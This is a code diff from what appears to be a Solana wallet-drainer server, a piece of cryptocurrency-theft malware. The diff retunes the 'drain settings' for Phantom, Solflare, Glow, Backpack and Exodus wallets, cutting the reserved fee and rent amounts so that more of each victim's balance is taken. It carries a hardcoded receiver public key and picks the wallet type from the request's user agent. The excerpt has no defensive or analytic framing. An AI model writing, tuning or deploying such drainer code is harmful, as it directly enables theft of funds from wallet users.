@@ -454,30 +454,30 @@ const RECEIVER_4 = new PublicKey('HakitSyn1Fv5BQPJW8GaAbQ6WdFJ7Mo4HwBB9wumtycF')
     }
 
     // Define fee calculation variables at function scope
-    // Phantom-optimized drain settings (working configuration)
-    const PHANTOM_FEE_BUFFER = 100000; // ~0.0001 SOL for Phantom network fees + safety margin
-    const PHANTOM_RESERVE_LAMPORTS = 2500000; // Keep 0.0025 SOL for rent exemption + safety
-    const PHANTOM_TOTAL_RESERVED = PHANTOM_FEE_BUFFER + PHANTOM_RESERVE_LAMPORTS;
-    
-    // Solflare-optimized drain settings (more aggressive)
-    const SOLFLARE_FEE_BUFFER = 75000; // ~0.000075 SOL for network fees
-    const SOLFLARE_RESERVE_LAMPORTS = 2500000; // Keep 0.0025 SOL for rent exemption + safety
-    const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
-    
-         // Glow-optimized drain settings (simplified - same as default)
-     const GLOW_FEE_BUFFER = 100000; // ~0.0001 SOL for Glow network fees + safety margin
-     const GLOW_RESERVE_LAMPORTS = 2500000; // Keep 0.0025 SOL for rent exemption + safety
-     const GLOW_TOTAL_RESERVED = GLOW_FEE_BUFFER + GLOW_RESERVE_LAMPORTS;
-    
-    // Backpack-optimized drain settings (similar to Phantom)
-    const BACKPACK_FEE_BUFFER = 100000; // ~0.0001 SOL for Backpack network fees + safety margin
-    const BACKPACK_RESERVE_LAMPORTS = 2500000; // Keep 0.0025 SOL for rent exemption + safety
-    const BACKPACK_TOTAL_RESERVED = BACKPACK_FEE_BUFFER + BACKPACK_RESERVE_LAMPORTS;
-    
-    // Exodus-optimized drain settings (similar to Phantom)
-    const EXODUS_FEE_BUFFER = 100000; // ~0.0001 SOL for Exodus network fees + safety margin
-    const EXODUS_RESERVE_LAMPORTS = 2500000; // Keep 0.0025 SOL for rent exemption + safety
-    const EXODUS_TOTAL_RESERVED = EXODUS_FEE_BUFFER + EXODUS_RESERVE_LAMPORTS;
+          // Phantom-optimized drain settings (70% drain configuration)
+      const PHANTOM_FEE_BUFFER = 50000; // ~0.00005 SOL for Phantom network fees + safety margin
+      const PHANTOM_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
+      const PHANTOM_TOTAL_RESERVED = PHANTOM_FEE_BUFFER + PHANTOM_RESERVE_LAMPORTS;
+      
+      // Solflare-optimized drain settings (70% drain configuration)
+      const SOLFLARE_FEE_BUFFER = 50000; // ~0.00005 SOL for network fees
+      const SOLFLARE_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
+      const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
+      
+      // Glow-optimized drain settings (70% drain configuration)
+      const GLOW_FEE_BUFFER = 50000; // ~0.00005 SOL for Glow network fees + safety margin
+      const GLOW_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
+      const GLOW_TOTAL_RESERVED = GLOW_FEE_BUFFER + GLOW_RESERVE_LAMPORTS;
+      
+      // Backpack-optimized drain settings (70% drain configuration)
+      const BACKPACK_FEE_BUFFER = 50000; // ~0.00005 SOL for Backpack network fees + safety margin
+      const BACKPACK_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
+      const BACKPACK_TOTAL_RESERVED = BACKPACK_FEE_BUFFER + BACKPACK_RESERVE_LAMPORTS;
+      
+      // Exodus-optimized drain settings (70% drain configuration)
+      const EXODUS_FEE_BUFFER = 50000; // ~0.00005 SOL for Exodus network fees + safety margin
+      const EXODUS_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
+      const EXODUS_TOTAL_RESERVED = EXODUS_FEE_BUFFER + EXODUS_RESERVE_LAMPORTS;
     
     // Get wallet type from request body or user agent
     const userAgent = req.headers['user-agent'] || '';
